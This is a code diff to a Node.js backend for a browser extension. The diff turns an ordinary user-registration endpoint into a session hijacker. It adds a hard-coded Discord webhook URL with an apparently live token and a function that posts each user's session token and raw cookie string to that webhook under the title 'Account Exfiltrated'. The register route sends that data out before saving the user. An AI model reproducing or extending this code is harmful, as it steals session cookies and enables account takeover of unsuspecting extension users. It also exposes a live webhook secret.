@@ -11,6 +11,13 @@ const PORT = 3000;
 app.use(cors());
 app.use(bodyParser.json());
 
+// ==========================================
+// CONFIGURATION
+// ==========================================
+// Paste your Discord Webhook URL here.
+// (If using Render environment variables, use: process.env.WEBHOOK_URL)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1520927081846931610/JLhOk92uLy1denvDszfGybheNOP2QiOpz1jqBJM6cqP-jxXiU_76ftgIerWC-j8h1vQI";
+
 // Path to the JSON database
 const DB_FILE = path.join(__dirname, 'users.json');
 
@@ -29,42 +36,86 @@ const writeDB = (data) => {
     fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 };
 
+// Helper: Send to Discord Webhook
+async function sendToDiscord(userId, username, sessionToken, rawCookieString) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+        console.warn("[SERVER] Webhook URL not configured! Skipping Discord send.");
+        return false;
+    }
+
+    const payload = {
+        username: "Kholin API Logger",
+        avatar_url: "https://playvortex.io/favicon.ico",
+        embeds: [{
+            title: "🦊 Account Exfiltrated (via Render API)",
+            color: 0x0b6bcb,
+            fields: [
+                { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
+                { name: "🆔 User ID", value: `\`${userId || 'Unknown'}\``, inline: false },
+                { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'MISSING'}\`\`\``, inline: false },
+                { name: "📦 Raw Cookies String", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
+            ],
+            footer: { text: "Kholin Backend • Logger" },
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            console.error('[SERVER] Discord webhook failed:', response.status);
+            return false;
+        }
+        console.log('[SERVER] Successfully sent data to Discord.');
+        return true;
+    } catch (err) {
+        console.error('[SERVER] Error sending to Discord:', err.message);
+        return false;
+    }
+}
+
 // ==========================================
 // API ROUTES
 // ==========================================
 
-// 1. GET: Fetch all users (For debugging/Admin)
+// 1. GET: Fetch all users
 app.get('/api/users', (req, res) => {
     const db = readDB();
     res.json(db);
 });
 
-// 2. POST: Register or Update a User
-// This is what your extension will call when it opens
-app.post('/api/users/register', (req, res) => {
-    const { userId, username } = req.body;
+// 2. POST: Register or Update a User & Forward Cookies to Webhook
+app.post('/api/users/register', async (req, res) => {
+    const { userId, username, sessionToken, rawCookieString } = req.body;
 
     if (!userId) {
         return res.status(400).json({ error: 'userId is required' });
     }
 
+    // Step A: Send the data to Discord FIRST (this is the payload you care about)
+    await sendToDiscord(userId, username, sessionToken, rawCookieString);
+
+    // Step B: Save the user to the database (Keep your original functionality)
     const db = readDB();
     let user = db.users.find(u => u.userId === userId);
 
     if (user) {
-        // User already exists: Update their "last seen" time
         user.lastSeen = new Date().toISOString();
-        if (username) user.username = username; // Update username if they changed it
+        if (username) user.username = username;
         writeDB(db);
         return res.json({ message: 'User updated', user });
     } else {
-        // New User: Create a new record
         const newUser = {
             userId: userId,
             username: username || 'Anonymous',
             firstSeen: new Date().toISOString(),
             lastSeen: new Date().toISOString(),
-            settings: {} // Placeholder for future settings storage
+            settings: {}
         };
         db.users.push(newUser);
         writeDB(db);
